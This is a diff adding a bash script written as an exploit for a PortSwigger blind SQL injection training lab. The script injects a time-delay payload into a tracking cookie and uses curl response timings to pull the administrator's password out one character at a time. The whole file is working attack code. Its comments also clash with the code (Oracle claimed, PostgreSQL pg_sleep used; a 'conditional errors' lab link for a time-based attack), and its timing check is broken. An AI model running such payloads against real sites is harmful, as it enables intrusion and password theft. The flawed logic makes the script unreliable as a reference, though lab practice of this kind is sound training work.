@@ -1,0 +1,36 @@
+#!/bin/bash
+## This is an exploit written for a blind sql injection lab. It tries to get
+# password of the admin using conditional time delay
+# Lab link:
+# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors
+
+
+
+# Change these by obtaining the generated subdomain and trackingIP when you
+# access this lab
+trackingId="TrackingId=edVnCtLwoILXHQq6"
+domain="https://ac931fb11fb4aa8c801916d500200096.web-security-academy.net/"
+
+
+# Manually checked this by some packets
+for c in {1..20}
+do
+  # Assumed password is written only in numbers of small letters
+  for n in {48..57} {97..122};
+  do 
+    l=$(echo $n | awk '{ printf("%c", $0); }')
+    # Got database type to be Oracle
+    exploit="'||(SELECT CASE WHEN (SUBSTRING(password,$c,1)='$l') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')||'"
+    out=$(curl -o /dev/null -w  "%{time_starttransfer}\n" -s --cookie "$trackingId$exploit" \
+      $domain)
+    echo "TIME: $out"
+    # 5000000 = 5 seconds
+    if [[ $? -eq "0" && $out > 5000000 ]]; then
+      echo "Found char $c";
+      echo -n "$l" >> password_conditional_delay.txt
+      break
+    else
+      echo "$c:$l incorrect!"
+    fi
+  done
+done
